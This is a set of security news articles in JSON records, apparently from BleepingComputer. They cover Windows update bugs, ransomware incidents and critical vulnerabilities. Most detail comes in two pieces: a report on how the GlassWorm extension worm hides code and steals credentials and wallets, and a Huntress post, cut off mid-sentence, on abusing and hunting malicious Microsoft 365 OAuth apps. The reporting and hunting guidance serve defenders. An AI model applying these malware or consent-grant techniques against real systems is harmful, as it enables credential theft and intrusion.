{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "DNS0.EU private DNS service shuts down over sustainability issues", "url": "https://www.bleepingcomputer.com/news/security/dns0eu-private-dns-service-shuts-down-over-sustainability-issues/", "published": "Mon, 20 Oct 2025 17:05:17 -0400", "content": "The DNS0.EU non-profit public DNS service focused on European users announced its immediate shut down due to time and resource constraints.\nBased in France, the service was built as a resilient infrastructure across several hosting providers in every member state of the European Union.\nThe team behind DNS0.EU replaced all content on the website with a short announcement informing that they discontinued the service.\n\"The dns0.eu service has been discontinued. We would have liked to keep it running, but it was not sustainable for us in terms of time and resources,\" the DNS0.EU operator said.\nAvailable alternatives\nThe team thanked infrastructure and security partners, and recommended that people switch to DNS4EU, a privacy-focused resolver developed by ENISA, or NextDNS, whose founders helped create DNS0.EU.\nA DNS resolver translates the human-readable domain names into the numerical, machine-readable IP addresses so browsers can load the correct internet resources.\nBy default, connected devices use the DNS service from the Internet Service Provider (ISP) but they can choose other options, like Cloudflare (1.1.1.1), Google (8.8.8.8), OpenDNS (208.67.222.222), and Quad9 (9.9.9.9).\nDNS0.eu was a public recursive DNS resolver service launched in 2023 as a French-based non-profit organization. It promised no-logs functionality, end-to-end encryption for resistance to eavesdropping and tampering, as well as protection against malicious domains, be they phishing domains, or command-and-control (C2) malware servers.\nIt offered a free, secure, and GDPR-compliant DNS resolver that supported DNS‑over‑HTTPS, DNS‑over‑TLS, DNS-over-QUIC, and DNS‑over‑HTTP/3. It operated 62 servers in 27 cities in all EU member states, boasting a median latency of 12 milliseconds.\nIn addition, DNS0.EU provided child safety-focused filters for adult content, piracy, and ads, as well as increased detection of potentially malicious domains by looking into typosquatting, domain parking patterns, TLD reputation, homograph domains, and DGA-created URLs.\nDNS0.EU team's recommendations for users, DNS4EU and NextDNS also include protection features against fraudulent and malicious content. However, NextDNS provides more granular filtering for websites and apps through privacy, security, and parental control options.\nDNS4EU, co-funded by the European Union, is easier to set up and offers IP resolution that can block access to websites with fraudulent or malicious content, protect against content that is explicit or inappropriate for children, and stop ads.\nBleepingComputer has contacted DNS0.EU to learn more about the reasons behind the shut down of the service, and we will update this post when we hear back.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:35.978947"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Microsoft: October updates break USB input in Windows Recovery", "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-october-updates-break-usb-mice-and-keyboards-in-windows-recovery/", "published": "Mon, 20 Oct 2025 15:06:40 -0400", "content": "Update October 21, 05:08 EDT: Microsoft has released the KB5070773 emergency update to fix this issue.\nMicrosoft has confirmed that this month's security updates disable USB mice and keyboards in the Windows Recovery Environment (WinRE), making it unusable.\nWinRE is a minimal Windows-based environment that operates independently of the main operating system, allowing users to repair, restore, or troubleshoot the operating system even when Windows fails to start.\nHowever, as Microsoft revealed in a Windows release health dashboard update on Friday, after installing the KB5066835 October 2025 security updates, users will no longer be able to use their USB-wired mouse and keyboard while in recovery mode.\nThe company added that the input devices will still work while using the Windows operating systems, although if the users need to use WinRE they might already experience issues which require troubleshooting or repairing the OS.\n\"After installing the Windows security update released on October 14, 2025 (KB5066835), USB devices, such as keyboards and mice, do not function in the Windows Recovery Environment (WinRE),\" Microsoft said.\n\"This issue prevents navigation of any of the recovery options within WinRE. Note that the USB keyboard and mouse continue to work normally within the Windows operating system.\"\nThis known issue impacts both client (Windows 11 24H2 and Windows 11 25H2) and server (Windows Server 2025) platforms.\nUntil Redmond resolves this bug, users should be able to switch to Bluetooth wireless mice and keyboards or input devices that use old PS/2 connectors which shouldn't be affected.\nMicrosoft noted that the Windows team is working on a fix for this Windows Recovery issue, which will likely be available over the coming days.\nEarlier this year, Microsoft fixed a known issue causing erroneous 0x80070643 failure errors when installing April WinRE updates. In August 2024, it also retired Windows security updates that triggered 0x80070643 errors when installing WinRE updates on Windows 10, Windows 11, and Windows Server systems.\nOn Friday, the company also fixed Active Directory issues on Windows Server 2025 systems after installing security updates released since September and shared guidance on how to resolve smart card authentication issues impacting all Windows 10, Windows 11, and Windows Server devices after installing this month's Windows updates.\nOne day earlier, Microsoft removed two compatibility holds blocking Windows 11 upgrades via Windows Update and addressed another known issue that broke HTTP/2 localhost (127.0.0.1) connections after installing recent security updates.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:36.717570"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Retail giant Muji halts online sales after ransomware attack on supplier", "url": "https://www.bleepingcomputer.com/news/security/retail-giant-muji-halts-online-sales-after-ransomware-attack-on-supplier/", "published": "Mon, 20 Oct 2025 14:45:33 -0400", "content": "Japanese retail company Muji has taken offline its store due to a logistics outage caused by a ransomware attack at its delivery partner, Askul.\nOn Sunday evening (Japan timezone), Muji said that the issue caused all retail services were affected, including browsing or making purchases on online stores, viewing order histories via the Muji app, and displaying some web content.\nAlthough the company did not specify a timeline for restoring the systems, an update on Monday afternoon stated that only purchases from the online store and applying for a monthly flat-rate service continued to be impacted.\nMuji also said that it was investigating which shipments were impacted to determine the orders placed before the attack and send email notification to customers.\nA retailer of minimalist household goods, clothing, and furniture, Muji operates more than a thousand stores in Japan, China, Singapore, Europe, Australia, and North America.\nThe company has an annual revenue of roughly $4 billion, and it employs over 24,500 people worldwide.\nAskul is a large business-to-business and business-to-consumer office supplies and logistics e-commerce company owned by Yahoo! Japan Corporation.\nThe company issued a statement yesterday, informing that it was targeted by ransomware that caused operational disruptions.\n“Currently, a system failure has occurred on the Askul website due to a ransomware infection, and we have suspended orders and shipping operations,” reads the announcement (machine translated)\n“We are currently investigating the scope of the impact, including the leakage of personal information and customer data, and will notify you as soon as we know.”\nProduct return applications, receipt mailing, catalog shipping, and collection services have been suspended, while Askul’s customer service desk is also unreachable right now, by phone or through the website.\nGiven that Askul only handles Muji’s Japan sales, the disruption only impacts that region, and Muji’s shops in other countries are available and operating normally.\nAt the time of writing, no ransomware gangs have announced Askul on their extortion portals.\nThis incident comes shortly after another ransomware attack on Japan’s largest beer producer, Asahi, that forced it to suspend production operations and delay scheduled product launches.\nThe attack was claimed by Qilin ransomware. The company confirmed in a statement that the hackers stole data from its systems.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:37.495757"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Over 75,000 WatchGuard security devices vulnerable to critical RCE", "url": "https://www.bleepingcomputer.com/news/security/over-75-000-watchguard-security-devices-vulnerable-to-critical-rce/", "published": "Mon, 20 Oct 2025 13:42:08 -0400", "content": "Nearly 76,000 WatchGuard Firebox network security appliances are exposed on the public web and still vulnerable to a critical issue (CVE-2025-9242) that could allow a remote attacker to execute code without authentication.\nFirebox devices act as a central defense hub that controls traffic between internal and external networks, providing protection through policy management, security services, VPN, and real-time real-time visibility through WatchGuard Cloud.\nScans from The Shadowserver Foundation currently show that there are 75,835 vulnerable Firebox appliances across the world, most of them in Europe and North America.\nSpecifically, the United States tops the list with 24,500 endpoints, followed by Germany (7,300), Italy (6,800), United Kingdom (5,400), Canada (4,100), and France (2,000).\nWatchGuard disclosed CVE-2025-9242 in a security bulletin on September 17 and rated the vulnerability with a critical-severity score of 9.3. The security problem is an out-of-bounds write in the Fireware OS ‘iked’ process, which handles IKEv2 VPN negotiations.\nThe flaw can be exploited without authentication by sending specially crafted IKEv2 packets to vulnerable Firebox endpoints, forcing it to write data to unintended memory areas.\nIt only affects Firebox appliances that use IKEv2 VPNs with dynamic gateway peers, on versions 11.10.2 through 11.12.4_Update1, 12.0 through 12.11.3, and 2025.1\nThe vendor suggested an upgrade to one of the following versions:\n- 2025.1.1\n- 12.11.4\n- 12.5.13\n- 12.3.1_Update3 (B722811)\nUsers should know that version 11.x has reached end of support and will not receive security updates. The recommendation for them is to move to a version that is still supported.\nFor devices set up only with Branch Office VPNs to static gateway peers, the vendor points to the documentation for securing the connection using the IPSec and IKEv2 protocols as a temporary workaround.\nOn October 19, The Shadowserver Foundation detected 75,955 vulnerable Firebox firewalls. A spokesperson told BleepingComputer that the current scan is considered reliable, and the figures reflect real deployments and not honeypots, yet.\nAlthough no active exploitation of CVE-2025-9242 has been reported yet, administrators who haven’t applied the security updates are strongly advised to install the patch as soon as possible.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:38.237709"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "CISA: High-severity Windows SMB flaw now exploited in attacks", "url": "https://www.bleepingcomputer.com/news/security/cisa-high-severity-windows-smb-flaw-now-exploited-in-attacks/", "published": "Mon, 20 Oct 2025 13:18:16 -0400", "content": "CISA says threat actors are now actively exploiting a high-severity Windows SMB privilege escalation vulnerability that can let them gain SYSTEM privileges on unpatched systems.\nTracked as CVE-2025-33073, this security flaw impacts all Windows Server and Windows 10 versions, as well as Windows 11 systems up to Windows 11 24H2.\nMicrosoft patched the vulnerability during the June 2025 Patch Tuesday, when it also revealed that it stems from an improper access control weakness that enables authorized attackers to elevate privileges over a network.\n\"The attacker could convince a victim to connect to an attacker controlled malicious application (for example, SMB) server. Upon connecting, the malicious server could compromise the protocol,\" the company explained.\n\"To exploit this vulnerability, an attacker could execute a specially crafted malicious script to coerce the victim machine to connect back to the attack system using SMB and authenticate. This could result in elevation of privilege.\"\nAt the time, a security advisory indicated that information about the bug was already publicly accessible before the security updates were released, however the company has yet to publicly acknowledge CISA's claims that CVE-2025-33073 is under active exploitation.\nMicrosoft has attributed the discovery of this flaw to multiple security researchers, including CrowdStrike's Keisuke Hirata, Synacktiv's Wilfried Bécard, SySS GmbH's Stefan Walter, Google Project Zero's James Forshaw, and RedTeam Pentesting GmbH.\nCISA has yet to share more information regarding ongoing CVE-2025-33073 attacks, but it has added the flaw to its Known Exploited Vulnerabilities Catalog, giving Federal Civilian Executive Branch (FCEB) agencies three weeks to secure their systems by November 10, as mandated by Binding Operational Directive (BOD) 22-01.\nWhile BOD 22-01 only targets federal agencies, the U.S. cybersecurity agency encourages all organizations, including those in the private sector, to ensure that this actively exploited security bug is patched as soon as possible.\n\"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise,\" CISA cautioned on Monday.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:38.963579"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Self-spreading GlassWorm malware hits OpenVSX,  VS Code registries", "url": "https://www.bleepingcomputer.com/news/security/self-spreading-glassworm-malware-hits-openvsx-vs-code-registries/", "published": "Mon, 20 Oct 2025 12:13:20 -0400", "content": "A new and ongoing supply-chain attack is targeting developers on the OpenVSX and Microsoft Visual Studio marketplaces with self-spreading malware called GlassWorm that has been installed an estimated 35,800 times.\nThe malware hides its malicious code by using invisible characters. It can also spread itself using stolen account information to infect more extensions the victim can access.\nGlassWorm operators use Solana blockchain for command-and-control, making takedown very difficult, with Google Calendar as backup option.\nMicrosoft Visual Studio and the OpenVSX platforms host extensions and integrations for Visual Studio products and are constant targets of threat actors looking to steal cryptocurrency [1, 2, 3].\nResearchers at endpoint security provider Koi found that the current GlassWorm campaign relies on \"invisible Unicode characters that make malicious code literally disappear from code editors.\"\nOnce installed, the malware attempts to steal credentials for GitHub, npm, and OpenVSX accounts, as well as cryptocurrency wallet data from 49 extensions.\nAdditionally, GlassWorm deploys a SOCKS proxy to route malicious traffic through the victim’s machine and installs VNC clients (HVNC) for invisible remote access.\nThe worm has a hardcoded wallet with transactions on the Solana blockchain that provide base64-encoded links for the next-stage payloads. According to the researchers, the final payload is called ZOMBI and is a \"massively obfuscated JavaScript\" code that turns infected systems into nodes for the cybercriminal activities.\n\"GlassWorm's final stage - the ZOMBI module - transforms every infected developer workstation into a node in a criminal infrastructure network,\" Koi Security says.\nUsing the blockchain to hide payloads is a method that has been gaining traction due to the multiple operational benefits it offers, including resilience to takedowns, anonymity, low cost, and flexibility for updates.\nA backup method for sourcing payloads involves a Google Calendar event title that includes a base64-encoded URL. A third delivery mechanism uses direct connection to the IP address 217.69.3[.]218.\nFor further evasion and resilience, the malware uses BitTorrent’s Distributed Hash Table (DHT) for decentralized command distribution.\nResearchers found at least eleven extensions infected by GlassWorm on OpenVSX and one on Microsoft’s VS Code Marketplace:\n- codejoy.codejoy-vscode-extension@1.8.3 and 1.8.4\n- l-igh-t.vscode-theme-seti-folder@1.2.3\n- kleinesfilmroellchen.serenity-dsl-syntaxhighlight@0.3.2\n- JScearcy.rust-doc-viewer@4.2.1\n- SIRILMP.dark-theme-sm@3.11.4\n- CodeInKlingon.git-worktree-menu@1.0.9 and 1.0.91\n- ginfuru.better-nunjucks@0.3.2\n- ellacrity.recoil@0.7.4\n- grrrck.positron-plus-1-e@0.0.71\n- jeronimoekerdt.color-picker-universal@2.8.91\n- srcery-colors.srcery-colors@0.3.9\n- cline-ai-main.cline-ai-agent@3.1.3 (Microsoft VS Code)\nThe researchers say that seven extensions on OpenVSX were compromised on October 17 and more infections followed over the next couple of days on both OpenVSX and VS Code. Koi Security notes that the full impact is 35,800 active GlassWorm installations.\n\"Here's what makes this particularly urgent: VS Code extensions auto-update. When CodeJoy pushed version 1.8.3 with invisible malware, everyone with CodeJoy installed got automatically updated to the infected version. No user interaction. No warning. Just silent, automatic infection,\" the researchers say.\nAt publishing time, at least four of the compromised extensions Koi Security found, were still available for download on OpenVSX. Microsoft has removed the malicious extension frrom its marketplace following the researchers' alert.\nThe publishers of vscode-theme-seti-folder and git-worktree-menu have updated the extensions to remove the malicious code.\nLast month, a similar worm-style attack dubbed “Shai-Hulud” hit the npm ecosystem, compromising 187 packages. The malware used the TruffleHog scanning tool to identify secrets, passwords, and sensitive keys.\nKoi Security says that GlassWorm \"is one of the most sophisticated supply chain attack\" and the first documented case of a worm-like attack on VS Code.\nThe C2 and payload servers in the GlassWorm campaign remain active, the researchers warn. On Saturday, there were still ten extensions actively distributing the malware.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:39.730341"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Microsoft fixes Windows Server Active Directory sync issues", "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-windows-server-active-directory-sync-issues/", "published": "Mon, 20 Oct 2025 11:58:21 -0400", "content": "Microsoft is rolling out a fix for Active Directory issues affecting some Windows Server 2025 systems after installing security updates released since September.\nAs Redmond explained when it acknowledged it on Tuesday, this known issue affects Active Directory Domain Services (AD DS) synchronization, including Microsoft Entra Connect Sync.\n\"Applications that use the Active Directory directory synchronization (DirSync) control for on-premises Active Directory Domain Services (AD DS), such as when using Microsoft Entra Connect Sync, can result in incomplete synchronization of large AD security groups exceeding 10,000 members,\" Microsoft said.\n\"This issue occurs only on Windows Server 2025 after installing the September 2025 Windows security update (KB5065426), or later updates.\"\nMicrosoft now allows IT administrators to fix this bug on managed devices by installing and configuring this Known Issue Rollback Group Policy on impacted Windows devices.\nAdmins can find more information on deploying and configuring KIR group policies on Microsoft's support website.\nUntil next month's Patch Tuesday when the fix will rollout to all customers, the issue can also be resolved on non-managed business devices and for most home users by adding the following registry key as soon as possible to avoid Microsoft Entra Connect Sync disruptions:\nPath: Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Policies\\Microsoft\\FeatureManagement\\Overrides\nName: 2362988687\nType: REG_DWORD\nValue: 0\nMicrosoft is also working to fix a bug affecting Windows 11 24H2 and Windows Server 2025 devices and causing Windows update failures when using the Windows Update Standalone Installer (WUSA) to install updates from a network share.\nOn Friday, the company also provided guidance on addressing smart card authentication issues impacting all Windows 10, Windows 11, and Windows Server releases after installing the October 2025 Windows security updates.\nOne day earlier, Microsoft fixed another known issue breaking HTTP/2 localhost (127.0.0.1) connections after installing recent Windows security updates and removed two compatibility holds that blocked users from Windows 11 upgrades via Windows Update.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:40.490358"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Microsoft warns of Windows smart card auth issues after October updates", "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-october-security-updates-cause-windows-smart-card-auth-issues/", "published": "Mon, 20 Oct 2025 10:21:54 -0400", "content": "Microsoft says the October 2025 Windows security updates are causing smart card authentication and certificate issues due to a change designed to strengthen the Windows Cryptographic Services.\nThis known issue impacts all Windows 10, Windows 11, and Windows Server releases, including the latest versions designated for broad deployment.\nAffected users may observe various symptoms, from the inability to sign documents and failures in applications that use certificate-based authentication to smart cards not being recognized as CSP providers (Cryptographic Service Provider) in 32-bit apps.\nThey can also see \"invalid provider type specified\" and \"CryptAcquireCertificatePrivateKey error.\" error messages.\n\"This issue is linked to a recent Windows security improvement to use KSP (Key Storage Provider) instead of CSP (Cryptographic Service Provider) for RSA-based smart card certificates to improve cryptography,\" Microsoft said.\n\"You can detect if your smart card will be affected by this issue if you observe the presence of Event ID 624 in the System event logs for the Smart Card Service prior to installing the October 2025 Windows security update.\"\nAs the company explained, this known issues occurs because this month's security updates are automatically enabling by default a security fix designed to address a security feature bypass vulnerability (CVE-2024-30098) in the Windows Cryptographic Services, built-in Windows service that handles security-related and cryptographic operations.\nThis fix is enabled by setting the DisableCapiOverrideForRSA registry key value to 1 to isolate cryptographic operations from the Smart Card implementation and block attackers from creating a SHA1 hash collision to bypass digital signatures on vulnerable systems.\nThose who are experiencing authentication problems can manually resolve it by disabling the DisableCapiOverrideForRSA registry key using the following procedure:\n- Open Registry Editor. Press Win + R, type regedit, and press Enter. If prompted by User Account Control, click Yes.\n- Navigate to the subkey. Go to: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Calais.\n- Edit the key and set the value. Inside Calais, check if key DisableCapiOverrideForRSA exists. Double-click DisableCapiOverrideForRSA. In Value date, enter: 0.\n- Close and restart. Close Registry Editor. Restart the computer for changes to take effect.\nHowever, it's important to note that you should first back up the registry before editing the Windows registry because any errors could lead to system issues.\nWhile this will mitigate the issue, the DisableCapiOverrideForRSA registry key will be removed in April 2026, and Microsoft advised affected users to work with their application vendors to resolve the underlying problem.\nRedmond fixed a similar issue that caused smartcard authentication failures on Windows 10 systems when connecting via Remote Desktop.\nOn Thursday, Microsoft fixed another known issue breaking IIS websites and HTTP/2 localhost (127.0.0.1) connections after installing recent Windows security updates.\nThe same day, the company also removed two compatibility holds preventing users from upgrading their systems to Windows 11 24H2 via Windows Update.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:41.255936"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "Find hidden malicious OAuth apps in Microsoft 365 using Cazadora", "url": "https://www.bleepingcomputer.com/news/security/find-hidden-malicious-oauth-apps-in-microsoft-365-using-cazadora/", "published": "Mon, 20 Oct 2025 10:00:10 -0400", "content": "Author: Matt Kiely, Principal Security Researcher at Huntress Labs\nTl;dr: If you manage even one Microsoft 365 tenant, it’s time to audit your OAuth apps. Statistically speaking, there’s a strong chance a malicious app is lurking in your environment.\nI wrote an open source script that can help you do this: https://github.com/HuskyHacks/cazadora\nSpecifically, look in your Enterprise Applications and Application Registrations for:\n-\nApps named after a user account\n-\nApps named “Test” or “Test App” or something similar\n-\nApps named after the tenant domain name where they are installed\n-\nApps using arbitrary strings as the designated names, like apps with non-alphanumeric names (i.e. “........”)\n-\nAnomalous reply URLs, specifically including a local loopback URL with port 7823 [“http://localhost:7823/access/”]\nSeriously, go audit your apps! The article will be here when you get back.\nIf you are interested in nerdy threat intel stuff, read on.\nPicture this: it’s a beautiful Sunday morning and you’re looking forward to a well-deserved day of rest after a rough week. You groggily stumble into your kitchen and prepare your caffeinated beverage of choice. The sun is shining. The birds are chirping. You lean out your window and feel the summer breeze across your brow. You’re at peace for a moment. You’re happy to be alive.\nAnd then you look down and see that on your window sill stands a single, solitary, lone termite.\nAnd at first you think, “Well, it’s just one termite, no big deal.”\nAnd then you think about it for another second. And your blood runs cold because you realize the terrible truth: this is the only termite that you’ve seen, but there’s never just one termite.\nYour hopes of relaxation evaporate as you form a plan to tear up your kitchen floorboards.\nThis is, more or less, the position that myself and other staff at Huntress found themselves in when we started to look at the data about Azure applications and how they are used maliciously in our partner tenants. So come along with us for a wild ride as we rip up the kitchen floorboards and uncover exactly how big the termite nest really is!\nOAuth Application Attacks\nSince releasing the Unwanted Access capability, the Huntress SOC has been busy racking up the count of deterred identity attacks. We built the capability to target key areas of initial access in the identity space, including credential theft, token theft, adversary in the middle (AitM) attacks, and location/VPN anomaly logins.\nAccording to the data, the capability has put a massive dent into threat actor activity and we’re now squashing anywhere from three to six thousand cases of initial access every month.\nBut true to the art of cyber defense, it does us no good to sit back on our laurels. Hackers are like the zombies from I Am Legend.\nWhy? Well, both of them burn when exposed to direct sunlight. But more importantly, both will evolve to the point where your current defenses are meaningless after enough time has passed. So onward we press to find new avenues of identifying and breaking their attack chains.\nOne area of pressing research in particular is the concept of the Rogue App. Cloud applications are a core part of the user experience and give developers a powerful toolkit to build and scale. But as we’ve come to learn recently, the same benefits that make cloud applications so attractive for administrators and app developers also make them an attractive option for cybercriminals.\nThis seemed like the next best place to start looking for attacks that managed to slip by our systems of combating initial access.\nSo the team set out with some research questions to answer. How do OAuth applications work in Azure? How can they be leveraged during attacks? What makes them so powerful and useful to cybercriminals? What’s the best way to hunt these rogue apps down? And the final question which instilled a sense of dread in me: how many are out there?\nIn searching for the answers to these questions, we ended up getting way more than we bargained for.\nThe Systems at Play: How OAuth Apps Work\nHold onto your butts, because here’s a crash course in Azure applications and how they work. I’ll start by saying that this system is complicated and weird.\nOne resource that helped me with my understanding is John Savill’s Technical Training lecture on Azure App Registrations, Enterpriser Apps, and Service Principals. And for what it’s worth, John is a certified master of Azure administration and the thumbnail of this video is him looking concerned at having to explain the concept.\nSo, don’t worry about understanding the system all the way down to the nitty-gritty details. For the purposes of this blog, I’ll explain the concepts that are directly relevant to how apps can be used maliciously.\nApps in the cloud are much like apps on your phone or on your PC. They’re modular programs designed to do something useful. Apps in Azure hook into Entra ID so your M365 account could, for example, use a desktop client that organizes your cloud account’s emails.\nAzure splits applications into two categories: Enterprise Applications and Application Registrations. I find this naming convention extremely confusing and it took a while to sort out which one was which in my mind, but the main difference can be summarized by, “Did you build the app, or are you using an app that someone else built?”\nEnterprise applications are apps that are built, maintained, and published by someone else in another tenant that you are now using in your own tenant.\nApplication Registrations are apps that you are building, maintaining, and publishing in your own tenant for other people to use. In other words, an Application Registration is a bit like a template for an app, while an Enterprise Application is an instance of an app that someone is using.\nA developer will ostensibly write the code for the app and then build an Application Registration in their own tenant before publishing it for public or internal use.\nNow, let’s say some enterprising administrator wants to install your app in their tenant. Maybe they found your website and think that your app looks useful. Apps can’t just install themselves wherever they please. Could you imagine? It would be chaos.\nSo there must be some system of authentication (authN) and authorization (authZ) before someone can install an app in their tenant. This usually goes something like this:\n-\nThe user will request to install the app. While doing this, the user authenticates with their username, password, and MFA to ensure that the app is being installed by a trusted party.\n-\nThe app has a set of permissions that allows it to do whatever it was designed to do. For example, the permissions might allow the app to access the Graph API to retrieve the user’s emails. The app presents a prompt for the user to consent to the permissions.\n-\nThe user consents to the permissions and authorizes the app to access resources based on those permissions. With authentication and authorization now sorted, the app can do what it was designed to do.\n-\nA service principal is now installed in the user’s tenant that acts as an account for this app. It keeps track of the consented permissions and the identities that have consented to the app. The service account acts on behalf of the app while the app remains installed in the tenant.\nIf you skipped the previous section because it was boring, hey I can’t blame you. But the takeaways are as follows:\n-\nApps can be built in-house (Application Registrations) or installed from another tenant (Enterprise Applications).\n-\nApps can have delegated access on behalf of one or more users in a tenant to access resources.\n-\nAzure apps use the built-in system of authentication and authorization to function.\n-\nAny time an app is installed somewhere, a service principal is installed in that tenant that functions as the working account for that application.\n-\nAnd finally, Azure’s default configuration allows any user to install any application and consent to permissions specific to their own resource access without requiring review of the app!\nWhat we have here is a fantastic set of primitives for exploitation.\nWhy? Anyone who has spent time administering a large, complicated system of authentication and authorization will tell you that attackers love to find the unpatchable cracks of the system to perform exploitation.\nAny red teamer who has run a Kerberoasting attack will tell you that the best exploitation primitives are features, not bugs, and therefore can’t be patched. Apps in Azure follow suit to this axiom—they’re part of the ecosystem, for better or for worse.\nTheir customizability gives attackers plenty of options for fitting the app to the type of attack they want to execute. And they largely fly under the radar given how obtuse this whole system can be.\nWhen you use apps in Azure, evil or otherwise, you’re remaining entirely within the legitimate scaffolding that allows apps to function. To threat actors, that is an unbelievably powerful system to play around in. Let’s find out exactly how useful it can be.\nAbuse Huntress' Identity Security Assessment\nGo from thinking to knowing you’re secure with an Identity Security Assessment.\nStart a Managed ITDR trial to uncover rogue apps, suspicious logins, hidden inbox rules, and risky access activity in your Microsoft 365 tenant. Get a customized Identity Security Assessment, right to your inbox.\nWorst case? We find something. Best case? You know.\nAbuse our AssessmentTraitorware: Good Apps Gone Rogue\nA crowbar is an incredibly useful tool. You can use it to open crates, pry open doors if they’re stuck, and if you’re lucky, even escape from a massive underground research facility in the deserts of New Mexico. If you got that last reference, you pass the vibe check.\nA crowbar alone is neither good nor bad. It’s useful in many different contexts. And those contexts define how we see the crowbar as a tool. So whether you’re opening a crate of supplies or breaking into someone’s house, the crowbar remains the same. You can’t say all crowbars are evil all the time, of course. But most of the time you see someone breaking into a house, they have a crowbar!\nIn the world of Azure apps, the first category of apps that we’re hunting is a lot like a crowbar. We call this category Traitorware.\nThe term refers to apps that are not designed explicitly for evil purposes, but just happen to be extremely useful to hackers, cybercriminals, and shady characters. We hunt for apps that are overwhelmingly used in attacks, even if those apps are themselves not evil.\nThe closest endpoint security analog to this would be somewhere between Living Off the Land and Bring Your Own tools. This type of attack is most similar to Remote Monitoring and Management (RMM) installation during an endpoint intrusion—the threat actor brings a legitimate tool to the fight which happens to be useful for their shady purposes.\nAt the time of writing this post, there are five such apps that we consider to be smoking guns. Statistically speaking, these five apps are favored by attackers. With a sample size of about 1.5k reported instances and an average false positive rate of 1.8%, the data supports that detecting these apps will uncover far more hacking activity than legitimate activity.\nThe full list of Traitorware apps that we’ve compiled so far and more detail about how they are often abused is available at our open source repository of Rogue Apps.\nIf you’ve seen apps abused in similar ways, we’d love to hear about it! Please consider opening a PR and contributing to the knowledge base so we can better define and track this interesting emerging attack surface.\nStealthware: Farm-to-Table Evil Apps\nOn the other hand, the Azure app ecosystem also gives hackers the tools to build apps from the ground up that are designed to wreak havoc.\nI’m talking about farm-to-table, small-batch, home-grown, ethically-sourced, free-range, dolphin-safe, artisanal, hand-crafted EVIL APPS. Made by hacker hands and delivered straight to your tenant.\nThe long-form name for these attacks is “OAuth Illicit Consent Grant Attacks” but that’s like calling a dog Canis Lupus. Only nerds use scientific nomenclature, so you can be a cool nerd like me and call them Stealthware.\nThe tricky part about hunting Stealthware apps is that no two of them are alike. You can’t find them by looking for a specific app name. Each app is custom made and tailored to the type of exploitation that the hacker intends to carry out.\nI teach how to make one for education purposes in an episode of Tradecraft Tuesday, if you’re interested in that kind of thing.\nThe Hunt in Motion\nWith our threat model ironed out, it’s time to dive into the data and figure out the answer to the question: “Aside from that one termite, how many more are out there?” To do this, myself and Staff Threat Ops Developer Christina Parry set out on a data collection journey.\nWe enumerated over 8000 tenants across multiple verticals and industries, collected all of their Enterprise Applications and App Registrations, ran a whole bunch of analyses against the data, and presented our findings at BSidesNYC in October 2024. The long and short of it is this:\n-\nWe found evidence of both Traitorware and Stealthware in the surveyed tenants.\n-\nAbout 10% of the surveyed tenants had at least one of the Traitorware apps installed.\n-\nUsing a combination of global rarity, the number of users assigned per app, and the app’s granted permissions is an effective way to hunt down Stealthware.\n-\nApps with less than 1% global prevalence across the surveyed tenants that had delegated access to a single user were more likely to be Stealthware. The addition of classifying OAuth permissions into groups based on what they allowed hackers to do during intrusions and detecting rare apps that also had powerful permissions raised the hit rate significantly.\nFollowing our presentation, we went to work building the systems to expand the data and capture the data for all Huntress partner tenants. After re-analyzing and tweaking our analyses, we found that the finding regarding Traitorware applications remained consistent at about 10%.\nAfter publishing our findings, the Huntress SOC also went to work. Using the new telemetry, they formed a hunting hypothesis and identified over 500 instances of Stealthware applications across all partner tenants.\nI mentioned earlier that you can’t hunt for Stealthware by searching for an application name and the results proved that point. This is just a sample of some of the names of the confirmed true positive apps that we found:\nWith a few hypotheses now proven, we were finally in a position to make the call. OAuth App Attacks are not only present in the Huntress partner tenancy, but they are way 